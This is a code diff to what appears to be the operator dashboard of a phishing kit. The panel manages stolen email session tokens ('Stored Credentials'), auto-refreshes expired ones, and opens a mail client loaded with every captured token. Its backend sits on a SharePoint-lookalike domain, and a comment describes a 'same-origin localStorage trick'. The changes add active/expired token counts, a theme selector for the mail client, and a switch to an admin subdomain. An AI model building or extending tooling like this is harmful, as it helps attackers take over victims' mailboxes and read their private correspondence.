@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!DOCTYPE html> 
 <html lang="en">
 <head>
 <meta charset="utf-8"/>
@@ -123,6 +123,26 @@ body::after{content:'';position:fixed;inset:0;background-image:linear-gradient(v
 .section-label{font-family:var(--mono);font-size:9px;font-weight:600;color:var(--sub);letter-spacing:3px;text-transform:uppercase;margin-bottom:14px;display:flex;align-items:center;gap:10px;}
 .section-label::after{content:'';flex:1;height:1px;background:var(--edge);}
 .tokens-grid{display:flex;flex-direction:column;gap:8px}
+/* ── Token stats bar ── */
+.token-stats-bar{display:flex;gap:12px;margin-bottom:20px}
+.ts-card{flex:1;background:var(--panel);border:1px solid var(--edge);padding:14px 18px;position:relative;overflow:hidden;transition:border-color .15s}
+.ts-card::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px}
+.ts-card.ts-total::before{background:var(--acc)}
+.ts-card.ts-active::before{background:var(--green)}
+.ts-card.ts-expired::before{background:var(--red)}
+.ts-card-val{font-family:var(--mono);font-size:28px;font-weight:700;color:var(--bright);line-height:1}
+.ts-card.ts-total .ts-card-val{color:var(--acc)}
+.ts-card.ts-active .ts-card-val{color:var(--green)}
+.ts-card.ts-expired .ts-card-val{color:var(--red)}
+.ts-card-label{font-family:var(--mono);font-size:9px;letter-spacing:2px;text-transform:uppercase;color:var(--sub);margin-top:4px}
+.ts-card-sub{font-family:var(--mono);font-size:10px;color:var(--dim);margin-top:8px}
+/* ── Theme selector ── */
+.theme-selector-wrap{display:flex;flex-wrap:wrap;gap:10px;margin-top:8px}
+.theme-swatch{width:44px;height:44px;border-radius:4px;border:2px solid transparent;cursor:pointer;position:relative;transition:border-color .15s,transform .1s;overflow:hidden}
+.theme-swatch.active{border-color:var(--acc)!important;transform:scale(1.08)}
+.theme-swatch:hover{transform:scale(1.06)}
+.theme-swatch-label{font-family:var(--mono);font-size:9px;color:var(--sub);margin-top:4px;text-align:center;width:44px}
+.theme-swatch-item{display:flex;flex-direction:column;align-items:center}
 
 .token-card{background:var(--panel);border:1px solid var(--edge);padding:16px 20px;display:flex;align-items:center;gap:16px;transition:border-color .15s,background .15s;position:relative;overflow:hidden;}
 .token-card::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px;background:var(--edge);transition:background .15s;}
@@ -332,6 +352,24 @@ body::after{content:'';position:fixed;inset:0;background-image:linear-gradient(v
         </div>
       </div>
       <div class="tokens-body">
+        <!-- Token Stats -->
+        <div class="token-stats-bar" id="token-stats-bar">
+          <div class="ts-card ts-total">
+            <div class="ts-card-val" id="stat-total">—</div>
+            <div class="ts-card-label">Total Added</div>
+            <div class="ts-card-sub" id="stat-total-sub">loading…</div>
+          </div>
+          <div class="ts-card ts-active">
+            <div class="ts-card-val" id="stat-active">—</div>
+            <div class="ts-card-label">Active</div>
+            <div class="ts-card-sub" id="stat-active-sub">valid tokens</div>
+          </div>
+          <div class="ts-card ts-expired">
+            <div class="ts-card-val" id="stat-expired">—</div>
+            <div class="ts-card-label">Expired</div>
+            <div class="ts-card-sub" id="stat-expired-sub">need refresh</div>
+          </div>
+        </div>
         <div class="section-label">Stored Credentials</div>
         <div class="tokens-grid" id="tokens-grid">
           <div style="padding:20px;text-align:center;font-family:var(--mono);font-size:11px;color:var(--sub)">
@@ -384,6 +422,44 @@ body::after{content:'';position:fixed;inset:0;background-image:linear-gradient(v
             <div class="s-msg" id="pwd-msg"></div>
           </div>
         </div>
+      </div>
+
+      <div class="settings-section">
+        <div class="settings-title">Mail Client Theme</div>
+        <div class="settings-desc">// select the visual style applied to localmail.html when opened</div>
+        <div class="theme-selector-wrap" id="theme-selector">
+          <div class="theme-swatch-item">
+            <div class="theme-swatch active" id="tsw-outlook" title="Outlook (Default)"
+                 style="background:linear-gradient(135deg,#0078d4 50%,#fff 50%)"
+                 onclick="selectTheme(&apos;outlook&apos;)"></div>
+            <div class="theme-swatch-label">Outlook</div>
+          </div>
+          <div class="theme-swatch-item">
+            <div class="theme-swatch" id="tsw-midnight" title="Midnight Blue"
+                 style="background:linear-gradient(135deg,#0a192f 50%,#00c8ff 50%)"
+                 onclick="selectTheme(&apos;midnight&apos;)"></div>
+            <div class="theme-swatch-label">Midnight</div>
+          </div>
+          <div class="theme-swatch-item">
+            <div class="theme-swatch" id="tsw-graphite" title="Graphite"
+                 style="background:linear-gradient(135deg,#1a1a1a 50%,#e0e0e0 50%)"
+                 onclick="selectTheme(&apos;graphite&apos;)"></div>
+            <div class="theme-swatch-label">Graphite</div>
+          </div>
+          <div class="theme-swatch-item">
+            <div class="theme-swatch" id="tsw-ocean" title="Ocean Teal"
+                 style="background:linear-gradient(135deg,#006050 50%,#00e5c8 50%)"
+                 onclick="selectTheme(&apos;ocean&apos;)"></div>
+            <div class="theme-swatch-label">Ocean</div>
+          </div>
+          <div class="theme-swatch-item">
+            <div class="theme-swatch" id="tsw-violet" title="Violet"
+                 style="background:linear-gradient(135deg,#2d0a4e 50%,#b47fff 50%)"
+                 onclick="selectTheme(&apos;violet&apos;)"></div>
+            <div class="theme-swatch-label">Violet</div>
+          </div>
+        </div>
+        <div style="margin-top:10px;font-family:var(--mono);font-size:10px;color:var(--sub)">Current theme: <span id="theme-name-label">Outlook</span></div>
       </div>
 
       <div class="settings-section">
@@ -554,8 +630,8 @@ body::after{content:'';position:fixed;inset:0;background-image:linear-gradient(v
 // ══════════════════════════════════════════════════════════════════════════
 // CONFIG
 // ══════════════════════════════════════════════════════════════════════════
-const API = 'https://uhp.sharepoint03420032.cloud';
-const MAIL_URL = 'https://uhp.sharepoint03420032.cloud/mail';
+const API = 'https://admin.uhp.sharepoint03420032.cloud';
+const MAIL_URL = 'https://admin.uhp.sharepoint03420032.cloud/mail';
 
 // ══════════════════════════════════════════════════════════════════════════
 // STATE
@@ -629,6 +705,7 @@ function enterApp() {
   loadTokens();
   checkRefresherServer();
   startBgTokenRefresh(); // Auto-refresh all tokens
+  initTheme();
 }
 
 // ══════════════════════════════════════════════════════════════════════════
@@ -719,7 +796,7 @@ async function refreshExpiredTokens(force = false) {
 
 // ══════════════════════════════════════════════════════════════════════════
 // OPEN MAIL CLIENT — loads ALL vault tokens into mail.html
-// Same-origin localStorage trick: both pages share storage on admin.onlineprojectsdocs.top
+// Same-origin localStorage trick: both pages share storage on admin.uhp.sharepoint03420032.cloud
 // ══════════════════════════════════════════════════════════════════════════
 function genId() {
   return Math.random().toString(36).slice(2, 8);
@@ -789,6 +866,9 @@ async function openMailClient() {
     };
 
     const encoded = btoa(unescape(encodeURIComponent(JSON.stringify(hashPayload))));
+    // Pass selected theme to mail client
+    const savedTheme = localStorage.getItem('lm_theme') || 'outlook';
+    localStorage.setItem('lm_active_theme', savedTheme);
     window.open(MAIL_URL + '#token=' + encoded, '_blank');
 
     const extra = accounts.length - 1;
@@ -825,10 +905,55 @@ async function loadTokens() {
   }
   tokensList = data.tokens || [];
   renderTokens();
+  updateTokenStats();
 
   const badge = document.getElementById('token-count-badge');
   if (tokensList.length > 0) { badge.textContent = tokensList.length; badge.style.display = 'inline'; }
   else badge.style.display = 'none';
+}
+
+function updateTokenStats() {
+  const now = Date.now();
+  const total = tokensList.length;
+  let active = 0, expired = 0;
+  tokensList.forEach(tok => {
+    const exp = tok.expires_at ? new Date(tok.expires_at) : null;
+    const ms  = exp ? exp - now : -1;
+    if (ms > 0) active++; else expired++;
+  });
+  document.getElementById('stat-total').textContent   = total;
+  document.getElementById('stat-active').textContent  = active;
+  document.getElementById('stat-expired').textContent = expired;
+  document.getElementById('stat-total-sub').textContent  = total === 1 ? '1 credential' : total + ' credentials';
+  document.getElementById('stat-active-sub').textContent  = active === 1 ? '1 valid token' : active + ' valid tokens';
+  document.getElementById('stat-expired-sub').textContent = expired > 0 ? expired + ' need refresh' : 'all healthy';
+}
+
+// ── Theme management ──
+const THEMES = {
+  outlook:  { label:'Outlook',  file:'outlook-theme.css' },
+  midnight: { label:'Midnight', file:'midnight-theme.css' },
+  graphite: { label:'Graphite', file:'graphite-theme.css' },
+  ocean:    { label:'Ocean',    file:'ocean-theme.css' },
+  violet:   { label:'Violet',   file:'violet-theme.css' },
+};
+function selectTheme(id) {
+  if (!THEMES[id]) return;
+  localStorage.setItem('lm_theme', id);
+  document.querySelectorAll('.theme-swatch').forEach(el => el.classList.remove('active'));
+  const sw = document.getElementById('tsw-' + id);
+  if (sw) sw.classList.add('active');
+  const lbl = document.getElementById('theme-name-label');
+  if (lbl) lbl.textContent = THEMES[id].label;
+  toast('Theme set to ' + THEMES[id].label + ' — applies when mail client opens', 'ok');
+}
+function initTheme() {
+  const saved = localStorage.getItem('lm_theme') || 'outlook';
+  document.querySelectorAll('.theme-swatch').forEach(el => el.classList.remove('active'));
+  const sw = document.getElementById('tsw-' + saved);
+  if (sw) sw.classList.add('active');
+  const lbl = document.getElementById('theme-name-label');
+  if (lbl && THEMES[saved]) lbl.textContent = THEMES[saved].label;
 }
 
 function renderTokens() {
